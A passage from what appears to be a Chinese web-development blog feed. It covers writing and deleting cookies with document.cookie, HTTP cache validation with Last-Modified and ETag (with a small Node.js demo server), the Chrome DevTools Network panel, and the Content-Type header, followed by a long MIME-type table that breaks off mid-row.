<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
<pre><code class="language-js">document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
</code></pre>
<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
<p>各个属性的写入注意点如下。</p>
<ul>
<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
<li><code>max-age</code>属性的值为秒数。</li>
<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
</ul>
<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
<pre><code class="language-js">document.cookie = 'fontSize=14; '
  + 'expires=' + someDate.toGMTString() + '; '
  + 'path=/subdirectory; '
  + 'domain=*.example.com';
</code></pre>
<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
<pre><code class="language-js">document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
</code></pre>
<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
<h2 id="特点">特点</h2>
<h3 id="不可跨域">不可跨域</h3>
<p>每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用</p>
<p><strong>一级域名和二级域名之间是允许共享使用的</strong>（<strong>靠的是 domain）</strong>。</p>
<h2 id="转载">转载</h2>
<blockquote>
<p>阮一峰</p>
<p><a href="https://javascript.ruanyifeng.com/bom/cookie.html">https://javascript.ruanyifeng.com/bom/cookie.html</a></p>
</blockquote>
<h2 id="推荐阅读">推荐阅读</h2>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">MDN/HTTP/Cookies</a></p>
<p><a href="https://juejin.cn/post/6898630134530752520">前端鉴权的兄弟们：cookie、session、token、jwt、单点登录</a></p>
<p><a href="https://juejin.cn/post/6844904034181070861">傻傻分不清之 Cookie、Session、Token、JWT</a></p>
<p><a href="https://juejin.cn/post/6844903812092674061">深入了解浏览器存储--从cookie到WebStorage、IndexedDB</a></p>
<p><a href="https://juejin.cn/post/6914109129267740686">面试不再怕：史上最全的cookie知识点详解</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-缓存验证]]></title>
        <id>https://leecss.com/post/http-huan-cun-yan-zheng/</id>
        <link href="https://leecss.com/post/http-huan-cun-yan-zheng/">
        </link>
        <updated>2021-07-23T00:31:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>当我们给Catch-Control 设置了 no-catch 后，每次浏览器对这个资源的请求时，都会到服务器端进行资源验证，验证完之后，如果确定这个资源可以使用缓存，浏览器才会读取本地的缓存。</p>
<h2 id="缓存验证流程">缓存验证流程</h2>
<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1627000310327.jpg" alt="" loading="lazy"></figure>
<h2 id="方式">方式</h2>
<p>验证资源是否需要更新有两种方式： Last-Modified 与 Etag</p>
<h3 id="last-modified">Last-Modified</h3>
<p>上次修改时间。主要配合If-Modified-Since 或者 If-Unmodified-Since 这两个Header 使用。</p>
<p>通过对比请求首部字段If-Modified-Since和实体首部字段 Last-Modified，来判断是否使用缓存。</p>
<p>如果我们请求的一个资源，它返回的Header 中有Last-Modified 并指定了一个时间。那么下次浏览器再发送这个请求的时候就会带上这个时间，并把它放在 If-Modified-Since中；服务器就可以根据If-Modified-Since值对比资源上次修改的时间，如果两个时间一致，说明请求的资源都没有过更新，那么就可以使用缓存</p>
<h3 id="etag">Etag</h3>
<p>是一个更为严格的验证，通过数据签名的方式验证。主要配合 If-Match 或者 If-None-Match 使用。</p>
<p>它根据数据内容产生一个唯一的编码（数据不同，编码结果不同）。最典型的做法，是我们对数据内容做一个哈希计算。</p>
<p>当服务端加上<code>Last-Modified</code>,<code>Etag</code>，浏览器下次请求就会带上<code>If-Modified-Since</code>和<code>If-None-Match</code>,来进行缓存验证。</p>
<p><strong>使用缓存实例</strong></p>
<p>test.html</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta charset=&quot;UTF-8&quot;&gt;
  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    
&lt;/body&gt;
&lt;script src=&quot;/script.js&quot;&gt;&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>server.js</p>
<pre><code class="language-js">const http = require('http')
const fs = require('fs')

http.createServer(function (request, response) {
  console.log('request come', request.url)

  if (request.url === '/') {
    const html = fs.readFileSync('test.html', 'utf8')
    response.writeHead(200, {
      'Content-Type': 'text/html'
    })
    response.end(html)
  }

  if (request.url === '/script.js') {
    
    const etag = request.headers['if-none-match']
    if (etag === '777') {
      response.writeHead(304, {
        'Content-Type': 'text/javascript',
        'Cache-Control': 'max-age=2000000, no-cache',
        'Last-Modified': '123',
        'Etag': '777'
      })
      response.end()
    } else {
      response.writeHead(200, {
        'Content-Type': 'text/javascript',
        'Cache-Control': 'max-age=2000000, no-cache',
        'Last-Modified': '123',
        'Etag': '777'
      })
      response.end('console.log(&quot;script loaded twice&quot;)')
    }
  }
}).listen(8888)

console.log('server listening on 8888')
</code></pre>
<p>使用<code>node server.js</code>启动，在<code>http://localhost:8888/</code>上查看server.js的网络请求。</p>
<p>可以发现，状态码第一次是200，第二次及以后缓存范围期限内，都是304</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[chrome-开发者工具]]></title>
        <id>https://leecss.com/post/chrome-kai-fa-zhe-gong-ju/</id>
        <link href="https://leecss.com/post/chrome-kai-fa-zhe-gong-ju/">
        </link>
        <updated>2021-07-22T23:46:53.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>开发调试工具</p>
<h2 id="功能">功能</h2>
<h3 id="network">Network</h3>
<p>1、Disable cache</p>
<p>当勾选了Disable cache，浏览器发送http请求就不会再发送缓存相关的请求头，比如If-Modified-Since、If-None-Match等，即不再使用缓存。</p>
<p>2、connectionId</p>
<p>在name状态栏那一行右击，可以勾选要显示和隐藏的列，选择显示connectionId</p>
<blockquote>
<p><code>connectionId</code> is the unique identifier of the connection used for that query/TCP connection etc. It's a way of evaluating which resources are using which connection.</p>
<p>connectionId是用于该查询/TCP连接等的连接的唯一标识符。它是一种评估哪些资源正在使用哪个连接的方法。</p>
</blockquote>
<p>For example:</p>
<pre><code>Name      Connection ID    (TCP Handshake / Reused Connection)
foo.jpg   72218            Handshake
bar.jpg   72218            Reused
cat.jpg   79146            Handshake
baz.jpg   72218            Reused
dog.jpg   79146            Reused
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-实体首部字段Content-Type]]></title>
        <id>https://leecss.com/post/http-shi-ti-shou-bu-zi-duan-content-type/</id>
        <link href="https://leecss.com/post/http-shi-ti-shou-bu-zi-duan-content-type/">
        </link>
        <updated>2021-07-22T22:07:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p>
<p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p>
<p>语法格式：</p>
<pre><code class="language-http">Content-Type: text/html; charset=utf-8
Content-Type: multipart/form-data; boundary=something
</code></pre>
<h2 id="常见媒体类型">常见媒体类型</h2>
<ul>
<li>text/html ： HTML格式</li>
<li>text/plain ：纯文本格式</li>
<li>text/xml ： XML格式</li>
<li>image/gif ：gif图片格式</li>
<li>image/jpeg ：jpg图片格式</li>
<li>image/png：png图片格式</li>
</ul>
<p>以application开头的媒体格式类型：</p>
<ul>
<li>application/xhtml+xml ：XHTML格式</li>
<li>application/xml： XML数据格式</li>
<li>application/atom+xml ：Atom XML聚合格式</li>
<li>application/json： JSON数据格式</li>
<li>application/pdf：pdf格式</li>
<li>application/msword ： Word文档格式</li>
<li>application/octet-stream ： 二进制流数据（如常见的文件下载）</li>
<li>application/x-www-form-urlencoded ： <code>&lt;form encType=&quot;&quot;&gt;</code>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</li>
</ul>
<p>另外一种常见的媒体格式是上传文件之时使用的：</p>
<ul>
<li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li>
</ul>
<h2 id="http-content-type-对照表">HTTP content-type 对照表</h2>
<table>
<thead>
<tr>
<th style="text-align:left">文件扩展名</th>
<th style="text-align:left">Content-Type(Mime-Type)</th>
<th style="text-align:left">文件扩展名</th>
<th style="text-align:left">Content-Type(Mime-Type)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">.*（ 二进制流，不知道下载文件类型）</td>
<td style="text-align:left">application/octet-stream</td>
<td style="text-align:left">.tif</td>
<td style="text-align:left">image/tiff</td>
</tr>
<tr>
<td style="text-align:left">.001</td>
<td style="text-align:left">application/x-001</td>
<td style="text-align:left">.301</td>
<td style="text-align:left">application/x-301</td>
</tr>
<tr>
<td style="text-align:left">.323</td>
<td style="text-align:left">text/h323</td>
<td style="text-align:left">.906</td>
<td style="text-align:left">application/x-906</td>
</tr>
<tr>
<td style="text-align:left">.907</td>
<td style="text-align:left">drawing/907</td>
<td style="text-align:left">.a11</td>
<td style="text-align:left">application/x-a11</td>
</tr>
<tr>
<td style="text-align:left">.acp</td>
<td style="text-align:left">audio/x-mei-aac</td>
<td style="text-align:left">.ai</td>
<td style="text-align:left">application/postscript</td>
</tr>
<tr>
<td style="text-align:left">.aif</td>
<td style="text-align:left">audio/aiff</td>
<td style="text-align:left">.aifc</td>
<td style="text-align:left">audio/aiff</td>
</tr>
<tr>
<td style="text-align:left">.aiff</td>
<td style="text-align:left">audio/aiff</td>
<td style="text-align:left">.anv</td>
<td style="text-align:left">application/x-anv</td>
</tr>
<tr>
<td style="text-align:left">.asa</td>
<td style="text-align:left">text/asa</td>
<td style="text-align:left">.asf</td>
<td style="text-align:left">video/x-ms-asf</td>
</tr>
<tr>
<td style="text-align:left">.asp</td>
<td style="text-align:left">text/asp</td>
<td style="text-align:left">.asx</td>
<td style="text-align:left">video/x-ms-asf</td>
</tr>
<tr>
<td style="text-align:left">.au</td>
<td style="text-align:left">audio/basic</td>
<td style="text-align:left">.avi</td>
<td style="text-align:left">video/avi</td>
</tr>
<tr>
<td style="text-align:left">.awf</td>
<td style="text-align:left">application/vnd.adobe.workflow</td>
<td style="text-align:left">.biz</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.bmp</td>
<td style="text-align:left">application/x-bmp</td>
<td style="text-align:left">.bot</td>
<td style="text-align:left">application/x-bot</td>
</tr>
<tr>
<td style="text-align:left">.c4t</td>
<td style="text-align:left">application/x-c4t</td>
<td style="text-align:left">.c90</td>
<td style="text-align:left">application/x-c90</td>
</tr>
<tr>
<td style="text-align:left">.cal</td>
<td style="text-align:left">application/x-cals</td>
<td style="text-align:left">.cat</td>
<td style="text-align:left">application/vnd.ms-pki.seccat</td>
</tr>
<tr>
<td style="text-align:left">.cdf</td>
<td style="text-align:left">application/x-netcdf</td>
<td style="text-align:left">.cdr</td>
<td style="text-align:left">application/x-cdr</td>
</tr>
<tr>
<td style="text-align:left">.cel</td>
<td style="text-align:left">application/x-cel</td>
<td style="text-align:left">.cer</td>
<td style="text-align:left">application/x-x509-ca-cert</td>
</tr>
<tr>
<td style="text-align:left">.cg4</td>
<td style="text-align:left">application/x-g4</td>
<td style="text-align:left">.cgm</td>
<td style="text-align:left">application/x-cgm</td>
</tr>
<tr>
<td style="text-align:left">.cit</td>
<td style="text-align:left">application/x-cit</td>
<td style="text-align:left">.class</td>
<td style="text-align:left">java/*</td>
</tr>
<tr>
<td style="text-align:left">.cml</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.cmp</td>
<td style="text-align:left">application/x-cmp</td>
</tr>
<tr>
<td style="text-align:left">.cmx</td>
<td style="text-align:left">application/x-cmx</td>
<td style="text-align:left">.cot</td>
<td style="text-align:left">application/x-cot</td>
</tr>
<tr>
<td style="text-align:left">.crl</td>
<td style="text-align:left">application/pkix-crl</td>
<td style="text-align:left">.crt</td>
<td style="text-align:left">application/x-x509-ca-cert</td>
</tr>
<tr>
<td style="text-align:left">.csi</td>
<td style="text-align:left">application/x-csi</td>
<td style="text-align:left">.css</td>
<td style="text-align:left">text/css</td>
</tr>
<tr>
<td style="text-align:left">.cut</td>
<td style="text-align:left">application/x-cut</td>
<td style="text-align:left">.dbf</td>
<td style="text-align:left">application/x-dbf</td>
</tr>
<tr>
<td style="text-align:left">.dbm</td>
<td style="text-align:left">application/x-dbm</td>
<td style="text-align:left">.dbx</td>
<td style="text-align:left">application/x-dbx</td>
</tr>
<tr>
<td style="text-align:left">.dcd</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.dcx</td>
<td style="text-align:left">application/x-dcx</td>
</tr>
<tr>
<td style="text-align:left">.der</td>
<td style="text-align:left">application/x-x509-ca-cert</td>
<td style="text-align:left">.dgn</td>
<td style="text-align:left">application/x-dgn</td>
</tr>
<tr>
<td style="text-align:left">.dib</td>
<td style="text-align:left">application/x-dib</td>
<td style="text-align:left">.dll</td>
<td style="text-align:left">application/x-msdownload</td>
</tr>
<tr>
<td style="text-align:left">.doc</td>
<td style="text-align:left">application/msword</td>
<td style="text-align:left">.dot</td>
<td style="text-align:left">application/msword</td>
</tr>
<tr>
<td style="text-align:left">.drw</td>
<td style="text-align:left">application/x-drw</td>
<td style="text-align:left">.dtd</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.dwf</td>
<td style="text-align:left">Model/vnd.dwf</td>
<td style="text-align:left">.dwf</td>
<td style="text-align:left">application/x-dwf</td>
</tr>
<tr>
<td style="text-align:left">.dwg</td>
<td style="text-align:left">application/x-dwg</td>
<td style="text-align:left">.dxb</td>
<td style="text-align:left">application/x-dxb</td>
</tr>
<tr>
<td style="text-align:left">.dxf</td>
<td style="text-align:left">application/x-dxf</td>
<td style="text-align:left">.edn</td>
<td style="text-align:left">application/vnd.adobe.edn</td>
</tr>
<tr>
<td style="text-align:left">.emf</td>
<td style="text-align:left">application/x-emf</td>
<td style="text-align:left">.eml</td>
<td style="text-align:left">message/rfc822</td>
</tr>
<tr>
<td style="text-align:left">.ent</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.epi</td>
<td style="text-align:left">application/x-epi</td>
</tr>
<tr>
<td style="text-align:left">.eps</td>
<td style="text-align:left">application/x-ps</td>
<td style="text-align:left">.eps</td>
<td style="text-align:left">application/postscript</td>
</tr>
<tr>
<td style="text-align:left">.etd</td>
<td style="text-align:left">application/x-ebx</td>
<td style="text-align:left">.exe</td>
<td style="text-align:left">application/x-msdownload</td>
</tr>
<tr>
<td style="text-align:left">.fax</td>
<td style="text-align:left">image/fax</td>
<td style="text-align:left">.fdf</td>
<td style="text-align:left">application/vnd.fdf</td>
</tr>
<tr>
<td style="text-align:left">.fif</td>
<td style="text-align:left">application/fractals</td>
<td style="text-align:left">.fo</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.frm</td>
<td style="text-align:left">application/x-frm</td>
<td style="text-align:left">.g4</td>
<td style="text-align:left">application/x-g4</td>
</tr>
<tr>
<td style="text-align:left">.gbr</td>
<td style="text-align:left">application/x-gbr</td>
<td style="text-align:left">.</td>
<td style="text-align:left">application/x-</td>
</tr>
<tr>
<td style="text-align:left">.gif</td>
<td style="text-align:left">image/gif</td>
<td style="text-align:left">.gl2</td>
<td style="text-align:left">application/x-gl2</td>
</tr>
<tr>
<td style="text-align:left">.gp4</td>
<td style="text-align:left">application/x-gp4</td>
<td style="text-align:left">.hgl</td>
<td style="text-align:left">application/x-hgl</td>
</tr>
<tr>
<td style="text-align:left">.hmr</td>
<td style="text-align:left">application/x-hmr</td>
<td style="text-align:left">.hpg</td>
<td style="text-align:left">application/x-hpgl</td>
</tr>
<tr>
<td style="text-align:left">.hpl</td>
<td style="text-align:left">application/x-hpl</td>
<td style="text-align:left">.hqx</td>
<td style="text-align:left">application/mac-binhex40</td>
</tr>
<tr>
<td style="text-align:left">.hrf</td>
<td style="text-align:left">application/x-hrf</td>
<td style="text-align:left">.hta</td>
<td style="text-align:left">application/hta</td>
</tr>
<tr>
<td style="text-align:left">.htc</td>
<td style="text-align:left">text/x-component</td>
<td style="text-align:left">.htm</td>
<td style="text-align:left">text/html</td>
</tr>
<tr>
<td style="text-align:left">.html</td>
<td style="text-align:left">text/html</td>
<td style="text-align:left">.htt</td>
<td style="text-align:left">text/webviewhtml</td>
</tr>
<tr>
<td style="text-align:left">.htx</td>
<td style="text-align:left">text/html</td>
<td style="text-align:left">.icb</td>
<td style="text-align:left">application/x-icb</td>
</tr>
<tr>
<td style="text-align:left">.ico</td>
<td style="text-align:left">image/x-icon</td>
<td style="text-align:left">.ico</td>
<td style="text-align:left">application/x-ico</td>
</tr>
<tr>
<td style="text-align:left">.iff</td>
<td style="text-align:left">application/x-iff</td>
<td style="text-align:left">.ig4</td>
<td style="text-align:left">application/x-g4</td>
</tr>
<tr>
<td style="text-align:left">.igs</td>
<td style="text-align:left">application/x-igs</td>
<td style="text-align:left">.iii</td>
<td style="text-align:left">application/x-iphone</td>
</tr>
<tr>
<td style="text-align:left">.img</td>
<td style="text-align:left">application/x-img</td>
<td style="text-align:left">.ins</td>
<td style="text-align:left">application/x-internet-signup</td>
</tr>
<tr>
<td style="text-align:left">.isp</td>
<td style="text-align:left">application/x-internet-signup</td>
<td style="text-align:left">.IVF</td>
<td style="text-align:left">video/x-ivf</td>
</tr>
<tr>
<td style="text-align:left">.java</td>
<td style="text-align:left">java/*</td>
<td style="text-align:left">.jfif</td>
<td style="text-align:left">image/jpeg</td>
</tr>
<tr>
<td style="text-align:left">.jpe</td>
<td style="text-align:left">image/jpeg</td>
<td style="text-align:left">.jpe</td>
<td style="text-align:left">application/x-jpe</td>
</tr>
<tr>
<td style="text-align:left">.jpeg</td>
<td style="text-align:left">image/jpeg</td>
<td style="text-align:left">.jpg</td>
<td style="text-align:left">image/jpeg</td>
</tr>
<tr>
<td style="text-align:left">.jpg</td>
<td style="text-align:left">application/x-jpg</td>
<td style="text-align:left">.js</td>
<td style="text-align:left">application/x-javascript</td>
</tr>
<tr>
<td style="text-align:left">.jsp</td>
<td style="text-align:left">text/html</td>
<td style="text-align:left">.la1</td>
<td style="text-align:left">audio/x-liquid-file</td>
</tr>
<tr>
<td style="text-align:left">.lar</td>
<td style="text-align:left">application/x-laplayer-reg</td>
<td style="text-align:left">.latex</td>
<td style="text-align:left">application/x-latex</td>
</tr>
<tr>
<td style="text-align:left">.lavs</td>
<td style="text-align:left">audio/x-liquid-secure</td>
<td style="text-align:left">.lbm</td>
<td style="text-align:left">application/x-lbm</td>
</tr>
<tr>
<td style="text-align:left">.lmsff</td>
<td style="text-align:left">audio/x-la-lms</td>
<td style="text-align:left">.ls</td>
<td style="text-align:left">application/x-javascript</td>
</tr>
<tr>
<td style="text-align:left">.ltr</td>
<td style="text-align:left">application/x-ltr</td>
<td style="text-align:left">.m1v</td>
<td style="text-align:left">video/x-mpeg</td>
</tr>
<tr>
<td style="text-align:left">.m2v</td>
<td style="text-align:left">video/x-mpeg</td>
<td style="text-align:left">.m3u</td>
<td style="text-align:left">audio/mpegurl</td>
</tr>
<tr>
<td style="text-align:left">.m4e</td>
<td style="text-align:left">video/mpeg4</td>
<td style="text-align:left">.mac</td>
<td style="text-align:left">application/x-mac</td>
</tr>
<tr>
<td style="text-align:left">.man</td>
<td style="text-align:left">application/x-troff-man</td>
<td style="text-align:left">.math</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.mdb</td>
<td style="text-align:left">application/msaccess</td>
<td style="text-align:left">.mdb</td>
<td style="text-align:left">application/x-mdb</td>
</tr>
<tr>
<td style="text-align:left">.mfp</td>
<td style="text-align:left">application/x-shockwave-flash</td>
<td style="text-align:left">.mht</td>
<td style="text-align:left">message/rfc822</td>
</tr>
<tr>
<td style="text-align:left">.mhtml</td>
<td style="text-align:left">message/rfc822</td>
<td style="text-align:left">.mi</td>
<td style="text-align:left">application/x-mi</td>
</tr>
<tr>
<td style="text-align:left">.mid</td>
<td style="text-align:left">audio/mid</td>
<td style="text-align:left">.midi</td>
<td style="text-align:left">audio/mid</td>
</tr>
<tr>
<td style="text-align:left">.mil</td>
<td style="text-align:left">application/x-mil</td>
<td style="text-align:left">.mml</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.mnd</td>
<td style="text-align:left">audio/x-musicnet-download</td>
<td style="text-align:left">.mns</td>
<td style="text-align:left">audio/x-musicnet-stream</td>
</tr>
<tr>
<td style="text-align:left">.mocha</td>
<td style="text-align:left">application/x-javascript</td>
<td style="text-align:left">.movie</td>
<td style="text-align:left">video/x-sgi-movie</td>
</tr>
<tr>
<td style="text-align:left">.mp1</td>
<td style="text-align:left">audio/mp1</td>
<td style="text-align:left">.mp2</td>
<td style="text-align:left">audio/mp2</td>
</tr>
<tr>
<td style="text-align:left">.mp2v</td>
<td style="text-align:left">video/mpeg</td>
<td style="text-align:left">.mp3</td>
<td style="text-align:left">audio/mp3</td>
</tr>
<tr>
<td style="text-align:left">.mp4</td>
<td style="text-align:left">video/mpeg4</td>
<td style="text-align:left">.mpa</td>
<td style="text-align:left">video/x-mpg</td>
</tr>
<tr>
<td style="text-align:left">.mpd</td>
<td style="text-align:left">application/vnd.ms-project</td>
<td style="text-align:left">.mpe</td>
<td style="text-align:left">video/x-mpeg</td>
</tr>
<tr>
<td style="text-align:left">.mpeg</td>
<td style="text-align:left">video/mpg</td>
<td style="text-align:left">.mpg</td>
<td style="text-align:left">video/mpg</td>
</tr>
<tr>
<td style="text-align:left">.mpga</td>
<td style="text-align:left">audio/rn-mpeg</td>
<td style="text-align:left">.mpp</td>
<td style="text-align:left">application/vnd.ms-project</td>
</tr>
<tr>
<td style="text-align:left">.mps</td>
<td style="text-align:left">video/x-mpeg</td>
<td style="text-align:left">.mpt</td>
<td style="text-align:left">application/vnd.ms-project</td>
</tr>
<tr>
<td style="text-align:left">.mpv</td>
<td style="text-align:left">video/mpg</td>
<td style="text-align:left">.mpv2</td>
<td style="text-align:left">video/mpeg</td>
</tr>
<tr>
<td style="text-align:left">.mpw</td>
<td style="text-align:left">application/vnd.ms-project</td>
<td style="text-align:left">.mpx</td>
<td style="text-align:left">application/vnd.ms-project</td>
</tr>
<tr>
<td style="text-align:left">.mtx</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.mxp</td>
<td style="text-align:left">application/x-mmxp</td>
</tr>
<tr>
<td style="text-align:left">.net</td>
<td style="text-align:left">image/pnetvue</td>
<td style="text-align:left">.nrf</td>
<td style="text-align:left">application/x-nrf</td>
</tr>
<tr>
<td style="text-align:left">.nws</td>
<td style="text-align:left">message/rfc822</td>
<td style="text-align:left">.odc</td>
<td style="text-align:left">text/x-ms-odc</td>
</tr>
<tr>
<td style="text-align:left">.out</td>
<td style="text-align:left">application/x-out</td>
<td style="text-align:left">.p10</td>
<td style="text-align:left">application/pkcs10</td>
</tr>
<tr>
<td style="text-align:left">.p12</td>
<td style="text-align:left">application/x-pkcs12</td>
<td style="text-align:left">.p7b</td>
<td style="text-align:left">application/x-pkcs7-certificates</td>
</tr>
<tr>
<td style="text-align:left">.p7c</td>
<td style="text-align:left">application/pkcs7-mime</td>
<td style="text-align:left">.p7m</td>
<td style="text-align:left">application/pkcs7-mime</td>
</tr>
<tr>
<td style="text-align:left">.p7r</td>
<td style="text-align:left">application/x-pkcs7-certreqresp</td>
<td style="text-align:left">.p7s</td>
<td style="text-align:left">application/pkcs7-signature</td>
</tr>
<tr>
<td style="text-align:left">.pc5</td>
<td style="text-align:left">application/x-pc5</td>
<td style="text-align:left">.pci</td>
<td style="text-align:left">application/x-pci</td>
</tr>
<tr>
<td style="text-align:left">.pcl</td>
<td style="text-align:left">application/x-pcl</td>
<td style="text-align:left">.pcx</td>
<td style="text-align:left">application/x-pcx</td>
</tr>
<tr>
<td style="text-align:left">.pdf</td>
<td style="text-align:left">application/pdf</td>
<td style="text-align:left">.pdf</td>
<td style="text-align:left">application/pdf</td>
</tr>
<tr>
<td style="text-align:left">.pdx</td>
<td style="text-align:left">application/vnd.adobe.pdx</td>
<td style="text-align:left">.pfx</td>
<td style="text-align:left">application/x-pkcs12</td>
</tr>
<tr>
<td style="text-align:left">.pgl</td>
<td style="text-align:left">application/x-pgl</td>
<td style="text-align:left">.pic</td>
<td style="text-align:left">application/x-pic</td>
</tr>
<tr>
<td style="text-align:left">.pko</td>
<td style="text-align:left">application/vnd.ms-pki.pko</td>
<td style="text-align:left">.pl</td>
<td style="text-align:left">application/x-perl</td>
</tr>
<tr>
<td style="text-align:left">.plg</td>
<td style="text-align:left">text/html</td>
<td style="text-align:left">.pls</td>
<td style="text-align:left">audio/scpls</td>
</tr>
<tr>
<td style="text-align:left">.plt</td>
<td style="text-align:left">application/x-plt</td>
<td style="text-align:left">.png</td>
<td style="text-align:left">image/png</td>
</tr>
<tr>
<td style="text-align:left">.png</td>
<td style="text-align:left">application/x-png</td>
<td style="text-align:left">.pot</td>
<td style="text-align:left">application/vnd.ms-powerpoint</td>
</tr>
<tr>
<td style="text-align:left">.ppa</td>
<td style="text-align:left">application/vnd.ms-powerpoint</td>
<td style="text-align:left">.ppm</td>
<td style="text-align:left">application/x-ppm</td>
</tr>
<tr>
<td style="text-align:left">.pps</td>
<td style="text-align:left">application/vnd.ms-powerpoint</td>
<td style="text-align:left">.ppt</td>
<td style="text-align:left">application/vnd.ms-powerpoint</td>
</tr>
<tr>
<td style="text-align:left">.ppt</td>
<td style="text-align:left">application/x-ppt</td>
<td style="text-align:left">.pr</td>
<td style="text-align:left">application/x-pr</td>
</tr>
<tr>
<td style="text-align:left">.prf</td>
<td style="text-align:left">application/pics-rules</td>
<td style="text-align:left">.prn</td>
<td style="text-align:left">application/x-prn</td>
</tr>
<tr>
<td style="text-align:left">.prt</td>
<td style="text-align:left">application/x-prt</td>
<td style="text-align:left">.ps</td>
<td style="text-align:left">application/x-ps</td>
</tr>
<tr>
<td style="text-align:left">.ps</td>
<td style="text-align:left">application/postscript</td>
<td style="text-align:left">.ptn</td>
<td style="text-align:left">application/x-ptn</td>
</tr>
<tr>
<td style="text-align:left">.pwz</td>
<td style="text-align:left">application/vnd.ms-powerpoint</td>
<td style="text-align:left">.r3t</td>
<td style="text-align:left">text/vnd.rn-realtext3d</td>
</tr>
<tr>
<td style="text-align:left">.ra</td>
<td style="text-align:left">audio/vnd.rn-realaudio</td>
<td style="text-align:left">.ram</td>
<td style="text-align:left">audio/x-pn-realaudio</td>
</tr>
<tr>
<td style="text-align:left">.ras</td>
<td style="text-align:left">application/x-ras</td>
<td style="text-align:left">.rat</td>
<td style="text-align:left">application/rat-file</td>
</tr>
<tr>
<td style="text-align:left">.rdf</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.rec</td>
<td style="text-align:left">application/vnd.rn-recording</td>
</tr>
<tr>
<td style="text-align:left">.red</td>
<td style="text-align:left">application/x-red</td>
<td style="text-align:left">.rgb</td>
<td style="text-align:left">application/x-rgb</td>
</tr>
<tr>
<td style="text-align:left">.rjs</td>
<td style="text-align:left">application/vnd.rn-realsystem-rjs</td>
<td style="text-align:left">.rjt</td>
<td style="text-align:left">application/vnd.rn-realsystem-rjt</td>
</tr>
<tr>
<td style="text-align:left">.rlc</td>
<td style="text-align:left">application/x-rlc</td>
<td style="text-align:left">.rle</td>
<td style="text-align:left">application/x-rle</td>
</tr>
<tr>
<td style="text-align:left">.rm</td>
<td style="text-align:left">application/vnd.rn-realmedia</td>
<td style="text-align:left">.rmf</td>
<td style="text-align:left">application/vnd.adobe.rmf</td>
</tr>
<tr>
<td style="text-align:left">.rmi</td>
<td style="text-align:left">audio/mid</td>
<td style="text-align:left">.rmj</td>
<td style="text-align:left">application/vnd.rn-realsystem-rmj</td>
</tr>
<tr>
<td style="text-align:left">.rmm</td>
<td style="text-align:left">audio/x-pn-realaudio</td>
<td style="text-align:left">.rmp</td>
<td style="text-align:left">application/vnd.rn-rn_music_package</td>
</tr>
<tr>
<td style="text-align:left">.rms</td>
<td style="text-align:left">application/vnd.rn-realmedia-secure</td>
<td style="text-align:left">.rmvb</td>
<td style="text-align:left">application/vnd.rn-realmedia-vbr</td>
</tr>
<tr>
<td style="text-align:left">.rmx</td>
<td style="text-align:left">application/vnd.rn-realsystem-rmx</td>
<td style="text-align:left">.rnx</td>
<td style="text-align:left">application/vnd.rn-realplayer</td>
</tr>
<tr>
<td style="text-align:left">.rp</td>
